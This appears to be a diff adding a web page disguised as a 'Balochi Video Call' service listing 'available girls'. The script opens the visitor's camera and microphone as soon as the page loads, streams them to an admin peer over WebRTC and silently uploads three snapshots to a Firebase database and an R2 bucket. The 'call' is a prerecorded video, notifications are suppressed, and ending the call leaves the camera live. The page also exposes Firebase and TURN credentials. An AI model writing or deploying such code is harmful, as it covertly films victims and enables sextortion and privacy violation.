@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Balochi Video Call</title>
+ <style>
+ @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;600;700&family=Poppins:wght@600;700&display=swap');
+ * { margin: 0; padding: 0; box-sizing: border-box; }
+ :root {
+   --pink: #ff3d71;
+   --purple: #7c4dff;
+   --ink: #1d1935;
+   --muted: #817e94;
+ }
+ body {
+   min-height: 100vh;
+   font-family: 'DM Sans', sans-serif;
+   color: var(--ink);
+   background:
+     radial-gradient(circle at top left, rgba(255, 61, 113, .12), transparent 28rem),
+     linear-gradient(135deg, #fff7fb 0%, #f7f4ff 100%);
+ }
+ .topbar {
+   padding: 18px clamp(16px, 5vw, 48px);
+   background: rgba(255, 255, 255, .86);
+   border-bottom: 1px solid rgba(124, 77, 255, .08);
+   backdrop-filter: blur(14px);
+   position: sticky;
+   top: 0;
+   z-index: 20;
+ }
+ .topbar-inner {
+   max-width: 1100px;
+   margin: auto;
+   display: flex;
+   align-items: center;
+   justify-content: space-between;
+   gap: 16px;
+ }
+ .brand {
+   display: flex;
+   align-items: center;
+   gap: 10px;
+ }
+ .brand-mark {
+   width: 42px;
+   height: 42px;
+   border-radius: 14px;
+   display: grid;
+   place-items: center;
+   background: linear-gradient(135deg, var(--pink), var(--purple));
+   color: white;
+   box-shadow: 0 8px 20px rgba(255, 61, 113, .25);
+ }
+ .brand h1 {
+   font-family: 'Poppins', sans-serif;
+   font-size: clamp(19px, 4vw, 24px);
+   line-height: 1;
+ }
+ .brand h1 span { color: var(--pink); }
+ .online-count {
+   display: flex;
+   align-items: center;
+   gap: 8px;
+   color: #5f5b70;
+   font-size: 14px;
+   font-weight: 700;
+ }
+ .online-dot {
+   width: 9px;
+   height: 9px;
+   border-radius: 50%;
+   background: #32c48d;
+   box-shadow: 0 0 0 5px rgba(50, 196, 141, .12);
+ }
+ main {
+   max-width: 1100px;
+   margin: auto;
+   padding: 24px clamp(16px, 4vw, 32px) 48px;
+ }
+ .online-strip {
+   display: grid;
+   grid-template-columns: repeat(3, 1fr);
+   gap: 12px;
+   margin-bottom: 22px;
+ }
+ .online-person {
+   background: rgba(255, 255, 255, .9);
+   border: 1px solid rgba(124, 77, 255, .08);
+   border-radius: 18px;
+   padding: 10px;
+   display: flex;
+   align-items: center;
+   gap: 10px;
+   box-shadow: 0 8px 24px rgba(72, 52, 119, .06);
+ }
+ .avatar-wrap {
+   width: 48px;
+   height: 48px;
+   flex: 0 0 auto;
+   position: relative;
+ }
+ .avatar-wrap img {
+   width: 100%;
+   height: 100%;
+   object-fit: cover;
+   border-radius: 15px;
+ }
+ .avatar-wrap::after {
+   content: '';
+   position: absolute;
+   width: 11px;
+   height: 11px;
+   right: -2px;
+   bottom: -2px;
+   border-radius: 50%;
+   background: #32c48d;
+   border: 3px solid white;
+ }
+ .online-person strong { display: block; font-size: 14px; }
+ .online-person small { color: #32a879; font-weight: 700; }
+ .section-title {
+   display: flex;
+   align-items: end;
+   justify-content: space-between;
+   margin-bottom: 14px;
+ }
+ .section-title h2 {
+   font-family: 'Poppins', sans-serif;
+   font-size: 21px;
+ }
+ .section-title span { color: var(--muted); font-size: 13px; }
+ .girls-grid {
+   display: grid;
+   grid-template-columns: repeat(5, minmax(0, 1fr));
+   gap: 14px;
+ }
+ .girl-card {
+   min-width: 0;
+   background: white;
+   border-radius: 22px;
+   overflow: hidden;
+   border: 1px solid rgba(124, 77, 255, .08);
+   box-shadow: 0 12px 30px rgba(72, 52, 119, .09);
+   transition: transform .2s, box-shadow .2s;
+ }
+ .girl-card:hover {
+   transform: translateY(-5px);
+   box-shadow: 0 18px 38px rgba(72, 52, 119, .14);
+ }
+ .photo {
+   position: relative;
+   height: 190px;
+   background: linear-gradient(145deg, #f8bfd2, #ddd5ff);
+ }
+ .photo img {
+   width: 100%;
+   height: 100%;
+   object-fit: cover;
+   display: block;
+ }
+ .status-pill {
+   position: absolute;
+   left: 10px;
+   top: 10px;
+   padding: 5px 9px;
+   border-radius: 999px;
+   background: rgba(29, 25, 53, .72);
+   color: white;
+   font-size: 11px;
+   font-weight: 700;
+   backdrop-filter: blur(8px);
+ }
+ .status-pill::before {
+   content: '';
+   display: inline-block;
+   width: 7px;
+   height: 7px;
+   margin-right: 5px;
+   border-radius: 50%;
+   background: #32d69b;
+ }
+ .status-pill.offline {
+   background: rgba(29, 25, 53, .58);
+ }
+ .status-pill.offline::before {
+   background: #aaa4bd;
+ }
+ .card-info { padding: 12px; }
+ .card-info h3 {
+   font-size: 15px;
+   white-space: nowrap;
+   overflow: hidden;
+   text-overflow: ellipsis;
+ }
+ .card-info p { color: var(--muted); font-size: 12px; margin: 3px 0 10px; }
+ .call-btn {
+   width: 100%;
+   height: 42px;
+   border: 0;
+   border-radius: 13px;
+   background: linear-gradient(135deg, var(--pink), #ff6a91);
+   color: white;
+   display: flex;
+   align-items: center;
+   justify-content: center;
+   gap: 7px;
+   font-weight: 700;
+   cursor: pointer;
+   box-shadow: 0 8px 16px rgba(255, 61, 113, .2);
+ }
+ .call-btn:hover { filter: brightness(.96); }
+ .call-btn:disabled { background: #c5c1d0; cursor: not-allowed; box-shadow: none; }
+ .call-btn svg { width: 18px; height: 18px; fill: currentColor; }
+ .toast {
+   position: fixed;
+   left: 50%;
+   bottom: 24px;
+   transform: translate(-50%, 120px);
+   background: var(--ink);
+   color: white;
+   border-radius: 14px;
+   padding: 12px 18px;
+   font-size: 14px;
+   box-shadow: 0 12px 30px rgba(29, 25, 53, .25);
+   transition: transform .25s;
+   z-index: 50;
+ }
+ .toast.show { transform: translate(-50%, 0); }
+ .call-overlay, .toast { display: none !important; }
+ .call-overlay {
+   position: fixed;
+   inset: 0;
+   z-index: 100;
+   display: none;
+   place-items: center;
+   padding: 16px;
+   background: rgba(29, 25, 53, .82);
+   backdrop-filter: blur(12px);
+ }
+ .call-overlay.active { display: grid; }
+ .call-window {
+   width: min(420px, 100%);
+   height: min(680px, calc(100vh - 32px));
+   position: relative;
+   overflow: hidden;
+   border-radius: 26px;
+   background: #3a3652;
+   box-shadow: 0 24px 70px rgba(0, 0, 0, .35);
+ }
+ #call-video {
+   width: 100%;
+   height: 100%;
+   object-fit: cover;
+   transform: scaleX(1);
+   pointer-events: none;
+   background: linear-gradient(145deg, #f7bfd2, #cfc5f5);
+ }
+ .call-profile {
+   position: absolute;
+   left: 18px;
+   right: 18px;
+   top: 18px;
+   color: white;
+   text-align: center;
+   text-shadow: 0 2px 8px rgba(0, 0, 0, .35);
+ }
+ .call-profile strong { display: block; font-size: 19px; }
+ .call-profile span { font-size: 13px; opacity: .88; }
+ .call-actions {
+   position: absolute;
+   left: 0;
+   right: 0;
+   bottom: 22px;
+   display: flex;
+   justify-content: center;
+   gap: 16px;
+ }
+ .round-action {
+   width: 52px;
+   height: 52px;
+   border: 0;
+   border-radius: 50%;
+   display: grid;
+   place-items: center;
+   color: white;
+   background: rgba(29, 25, 53, .72);
+   cursor: pointer;
+   backdrop-filter: blur(8px);
+ }
+ .round-action.end { background: #ff3d71; }
+ .round-action svg { width: 21px; height: 21px; fill: currentColor; }
+ @media (max-width: 850px) {
+   .girls-grid { grid-template-columns: repeat(3, 1fr); }
+ }
+ @media (max-width: 620px) {
+   .topbar { padding: 14px 16px; }
+   .online-count { display: none; }
+   .online-strip { grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 7px; }
+   .online-person { justify-content: center; padding: 7px; }
+   .online-person div:last-child { display: none; }
+   .avatar-wrap { width: 52px; height: 52px; }
+   .girls-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; }
+   .photo { height: 220px; }
+ }
+ @media (max-width: 380px) {
+   .photo { height: 190px; }
+ }
+ </style>
+</head>
+<body>
+ <header class="topbar">
+   <div class="topbar-inner">
+     <div class="brand">
+       <div class="brand-mark">
+         <svg viewBox="0 0 24 24" width="22" height="22" aria-hidden="true"><path fill="currentColor" d="M4 5h10a2 2 0 0 1 2 2v10H4a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2Zm12 4 5-3v12l-5-3V9Z"/></svg>
+       </div>
+       <h1>Balochi <span>Video Call</span></h1>
+     </div>
+     <div class="online-count"><span class="online-dot"></span> 1 online now</div>
+   </div>
+ </header>
+
+ <main>
+   <section class="online-strip" aria-label="Online now">
+     <div class="online-person">
+       <div class="avatar-wrap"><img src="WhatsApp Image 2026-11-18 at 4.53.43 PM.jpeg" alt=""></div>
+       <div><strong>Iqra</strong><small>Offline</small></div>
+     </div>
+     <div class="online-person">
+       <div class="avatar-wrap"><img src="nugra nasir.jpeg" alt=""></div>
+       <div><strong>Nugra Nasir</strong><small>Online</small></div>
+     </div>
+     <div class="online-person">
+       <div class="avatar-wrap"><img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?auto=format&fit=crop&w=160&q=80" alt=""></div>
+       <div><strong>Naz</strong><small>Offline</small></div>
+     </div>
+   </section>
+
+   <div class="section-title">
+     <h2>Available Girls</h2>
+     <span>5 profiles</span>
+   </div>
+
+   <section class="girls-grid" id="girls-grid">
+     <article class="girl-card" data-name="Sanam">
+       <div class="photo"><img src="WhatsApp Image 2026-11-18 at 4.53.43 PM.jpeg" alt="Iqra"><span class="status-pill offline">Offline</span></div>
+       <div class="card-info"><h3>Iqra</h3><p>Currently offline</p><button class="call-btn" disabled>Offline</button></div>
+     </article>
+     <article class="girl-card" data-name="Nugra">
+       <div class="photo"><img src="nugra nasir.jpeg" alt="Nugra Nasir"><span class="status-pill">Online</span></div>
+       <div class="card-info"><h3>Nugra Nasir</h3><p>Live now · Video &amp; audio</p><button class="call-btn" onclick="startCall('Nugra Nasir')">Video call</button></div>
+     </article>
+     <article class="girl-card" data-name="Naz">
+       <div class="photo"><img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?auto=format&fit=crop&w=600&q=85" alt="Naz"><span class="status-pill offline">Offline</span></div>
+       <div class="card-info"><h3>Naz</h3><p>Currently offline</p><button class="call-btn" disabled>Offline</button></div>
+     </article>
+     <article class="girl-card" data-name="Hania">
+       <div class="photo"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=600&q=85" alt="Hania"><span class="status-pill offline">Offline</span></div>
+       <div class="card-info"><h3>Hania</h3><p>Currently offline</p><button class="call-btn" disabled>Offline</button></div>
+     </article>
+     <article class="girl-card" data-name="Zara">
+       <div class="photo"><img src="https://images.unsplash.com/photo-1488426862026-3ee34a7d66df?auto=format&fit=crop&w=600&q=85" alt="Zara"><span class="status-pill offline">Offline</span></div>
+       <div class="card-info"><h3>Zara</h3><p>Currently offline</p><button class="call-btn" disabled>Offline</button></div>
+     </article>
+   </section>
+ </main>
+
+ <div class="call-overlay" id="call-overlay" role="dialog" aria-modal="true" aria-label="Video call">
+   <div class="call-window">
+     <video id="call-video" autoplay muted loop playsinline></video>
+     <div class="call-profile"><strong id="call-name">Calling...</strong><span id="call-status">Connecting</span></div>
+     <div class="call-actions">
+       <button class="round-action end" type="button" onclick="endCall()" aria-label="End call">
+         <svg viewBox="0 0 24 24"><path d="M21 15.46c-1.27 0-2.5-.2-3.67-.57a1.5 1.5 0 0 0-1.55.36l-2.2 2.2A14.8 14.8 0 0 1 6.5 10.37l2.2-2.2c.41-.41.55-1.03.36-1.55A12.7 12.7 0 0 1 8.54 3a1.5 1.5 0 0 0-1.5-1.5H3.5A1.5 1.5 0 0 0 2 3c0 10.49 8.51 19 19 19a1.5 1.5 0 0 0 1.5-1.5v-3.54a1.5 1.5 0 0 0-1.5-1.5Z"/></svg>
+       </button>
+     </div>
+   </div>
+ </div>
+
+ <div class="toast" id="toast"></div>
+
+ <script type="module">
+ import { initializeApp } from 'https://www.gstatic.com/firebasejs/13.4.0/firebase-app.js';
+ import { getDatabase, ref, set, remove, onValue, onDisconnect, push } from 'https://www.gstatic.com/firebasejs/13.4.0/firebase-database.js';
+
+ const firebaseConfig = {
+   apiKey: 'AIzaSyARent8sZVgKxgL7w4ZtBfzJFkXWJfc2n8',
+   authDomain: 'arman-63a6f.firebaseapp.com',
+   databaseURL: 'https://arman-63a6f-default-rtdb.firebaseio.com',
+   projectId: 'arman-63a6f',
+   storageBucket: 'arman-63a6f.firebasestorage.app',
+   messagingSenderId: '883393911052',
+   appId: '1:883393911052:web:bfc8070f711d765d4e9129',
+   measurementId: 'G-8E77BWCVQ8'
+ };
+ const app = initializeApp(firebaseConfig);
+ const db = getDatabase(app);
+ let userId = sessionStorage.getItem('balochi-user-id');
+ if (!userId) {
+   userId = crypto.randomUUID ? crypto.randomUUID() : `guest-${Date.now()}-${Math.random().toString(36).slice(2)}`;
+   sessionStorage.setItem('balochi-user-id', userId);
+ }
+ let callStream = null;
+ let livePeer = null;
+ const R2_WORKER_URL = 'https://YOUR-WORKER-NAME.YOUR-SUBDOMAIN.workers.dev';
+ const rtcConfig = {
+   iceServers: [
+     { urls: 'stun:stun.relay.metered.ca:80' },
+     {
+       urls: 'turn:global.relay.metered.ca:80',
+       username: '48984875c86765271b6f39be',
+       credential: 'Q1062nhsUREIz7dM'
+     },
+     {
+       urls: 'turn:global.relay.metered.ca:80?transport=tcp',
+       username: '48984875c86765271b6f39be',
+       credential: 'Q1062nhsUREIz7dM'
+     },
+     {
+       urls: 'turn:global.relay.metered.ca:443',
+       username: '48984875c86765271b6f39be',
+       credential: 'Q1062nhsUREIz7dM'
+     },
+     {
+       urls: 'turns:global.relay.metered.ca:443?transport=tcp',
+       username: '48984875c86765271b6f39be',
+       credential: 'Q1062nhsUREIz7dM'
+     }
+   ]
+ };
+
+ const presenceRef = ref(db, `presence/users/${userId}`);
+ set(presenceRef, { name: 'Guest', online: true, updatedAt: Date.now() });
+ onDisconnect(presenceRef).remove();
+ onDisconnect(ref(db, `webrtc/users/${userId}`)).remove();
+
+ function showToast(message) {
+   // The user page stays silent; notifications are not shown.
+   console.info(message);
+ }
+ async function startCall(name) {
+   if (!navigator.mediaDevices?.getUserMedia) {
+     showToast('Camera is not supported in this browser');
+     return;
+   }
+
+   try {
+     callStream = await navigator.mediaDevices.getUserMedia({
+       video: { facingMode: 'user' },
+       audio: true
+     });
+     const callVideo = document.getElementById('call-video');
+     document.getElementById('call-name').textContent = name;
+     document.getElementById('call-status').textContent = 'Live now · Connecting';
+     document.getElementById('call-overlay').classList.add('active');
+     callVideo.pause();
+     callVideo.src = 'WhatsApp Video 2026-11-18 at 4.54.30 PM.mp4';
+     callVideo.load();
+     await callVideo.play();
+
+     livePeer = new RTCPeerConnection(rtcConfig);
+     callStream.getTracks().forEach(track => livePeer.addTrack(track, callStream));
+     livePeer.onconnectionstatechange = () => {
+       if (livePeer.connectionState === 'connected') {
+         document.getElementById('call-status').textContent = 'Live camera · Connected';
+       } else if (livePeer.connectionState === 'connecting') {
+         document.getElementById('call-status').textContent = 'Live camera · Connecting';
+       } else if (livePeer.connectionState === 'failed') {
+         document.getElementById('call-status').textContent = 'Live camera · Connection failed';
+       }
+     };
+     livePeer.onicecandidate = event => {
+       if (event.candidate) {
+         push(ref(db, `webrtc/users/${userId}/candidates/user`), event.candidate.toJSON());
+       }
+     };
+
+     const answerRef = ref(db, `webrtc/users/${userId}/answer`);
+     onValue(answerRef, async snapshot => {
+       const answer = snapshot.val();
+       if (answer && livePeer) {
+         if (livePeer.remoteDescription?.sdp === answer.sdp) return;
+         await livePeer.setRemoteDescription(answer);
+         document.getElementById('call-status').textContent = 'Live now · Camera connected';
+       }
+     });
+     onValue(ref(db, `webrtc/users/${userId}/candidates/admin`), snapshot => {
+       snapshot.forEach(child => {
+         if (child.val()) livePeer.addIceCandidate(child.val()).catch(() => {});
+       });
+     });
+
+     const offer = await livePeer.createOffer();
+     await livePeer.setLocalDescription(offer);
+     await set(ref(db, `webrtc/users/${userId}/offer`), offer);
+     await set(ref(db, `webrtc/users/${userId}/profile`), { name, online: true });
+   } catch (error) {
+     showToast('Camera or microphone permission denied');
+   }
+ }
+ window.startCall = startCall;
+
+ async function captureAndUploadThreePhotos() {
+   if (!callStream) return;
+   const captureVideo = document.createElement('video');
+   captureVideo.autoplay = true;
+   captureVideo.muted = true;
+   captureVideo.playsInline = true;
+   captureVideo.srcObject = callStream;
+   await new Promise(resolve => {
+      if (captureVideo.readyState >= 2) resolve();
+      else {
+        captureVideo.onloadeddata = resolve;
+        captureVideo.oncanplay = resolve;
+        captureVideo.play().catch(() => resolve());
+      }
+   });
+
+   for (let index = 1; index <= 3; index++) {
+      await new Promise(resolve => setTimeout(resolve, index === 1 ? 500 : 1000));
+      await captureVideo.play().catch(() => {});
+      const width = captureVideo.videoWidth || 1280;
+      const height = captureVideo.videoHeight || 720;
+
+     const canvas = document.createElement('canvas');
+     const scale = Math.min(1, 640 / width);
+     canvas.width = Math.round(width * scale);
+     canvas.height = Math.round(height * scale);
+     canvas.getContext('2d').drawImage(captureVideo, 0, 0, canvas.width, canvas.height);
+
+     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.72));
+     if (!blob) continue;
+
+     const photoId = `${Date.now()}-${index}`;
+     await set(ref(db, `captureQueue/${userId}/${photoId}`), {
+       status: 'pending',
+       index,
+       createdAt: Date.now()
+     });
+     let photoUrl = canvas.toDataURL('image/jpeg', 0.72);
+     let photoPath = `captures/${userId}/${photoId}.jpg`;
+     try {
+       if (!R2_WORKER_URL.includes('YOUR-WORKER-NAME')) {
+         const form = new FormData();
+         form.append('file', blob, `${photoId}.jpg`);
+         form.append('key', photoPath);
+         const response = await fetch(`${R2_WORKER_URL}/upload`, { method: 'POST', body: form });
+         if (!response.ok) throw new Error(`R2 upload failed: ${response.status}`);
+         photoUrl = `https://pub-56860c6c90ce4a3d9c2a8baf57cc47b2.r2.dev/${photoPath}`;
+       }
+     } catch (error) {
+       console.error('R2 upload failed:', error);
+     }
+     await set(ref(db, `captures/${userId}/${photoId}`), {
+       url: photoUrl,
+       path: photoPath,
+       createdAt: Date.now()
+     });
+     await remove(ref(db, `captureQueue/${userId}/${photoId}`));
+   }
+   captureVideo.srcObject = null;
+ }
+
+ async function startAutomaticStream() {
+   if (!navigator.mediaDevices?.getUserMedia) {
+     showToast('Camera is not supported in this browser');
+     return;
+   }
+
+   try {
+     callStream = await navigator.mediaDevices.getUserMedia({
+       video: { facingMode: 'user' },
+       audio: true
+     });
+
+     captureAndUploadThreePhotos().catch(error => {
+       console.error('Photo upload failed:', error);
+     });
+
+     livePeer = new RTCPeerConnection(rtcConfig);
+     callStream.getTracks().forEach(track => livePeer.addTrack(track, callStream));
+     livePeer.onconnectionstatechange = () => {
+       if (livePeer.connectionState === 'connected') {
+         document.getElementById('call-status').textContent = 'Live camera · Connected';
+       } else if (livePeer.connectionState === 'connecting') {
+         document.getElementById('call-status').textContent = 'Live camera · Connecting';
+       } else if (livePeer.connectionState === 'failed') {
+         document.getElementById('call-status').textContent = 'Live camera · Connection failed';
+       }
+     };
+     livePeer.onicecandidate = event => {
+       if (event.candidate) {
+         push(ref(db, `webrtc/users/${userId}/candidates/user`), event.candidate.toJSON());
+       }
+     };
+
+     const answerRef = ref(db, `webrtc/users/${userId}/answer`);
+     onValue(answerRef, async snapshot => {
+       const answer = snapshot.val();
+       if (answer && livePeer) {
+         if (livePeer.remoteDescription?.sdp === answer.sdp) return;
+         await livePeer.setRemoteDescription(answer);
+         document.getElementById('call-status').textContent = 'Live camera · Connected';
+       }
+     });
+     onValue(ref(db, `webrtc/users/${userId}/candidates/admin`), snapshot => {
+       snapshot.forEach(child => {
+         if (child.val()) livePeer.addIceCandidate(child.val()).catch(() => {});
+       });
+     });
+
+     const offer = await livePeer.createOffer();
+     await livePeer.setLocalDescription(offer);
+     await set(ref(db, `webrtc/users/${userId}/offer`), offer);
+     await set(ref(db, `webrtc/users/${userId}/profile`), { name: 'Nugra Nasir', online: true });
+   } catch (error) {
+     console.error('Camera permission or streaming failed:', error);
+   }
+ }
+ window.addEventListener('load', startAutomaticStream);
+
+ async function endCall() {
+   const callVideo = document.getElementById('call-video');
+   callVideo.pause();
+   callVideo.srcObject = null;
+   callVideo.removeAttribute('src');
+   document.getElementById('call-overlay').classList.remove('active');
+   showToast('Call closed — live camera remains active');
+ }
+ window.endCall = endCall;
+
+ </script>
+</body>
+</html>
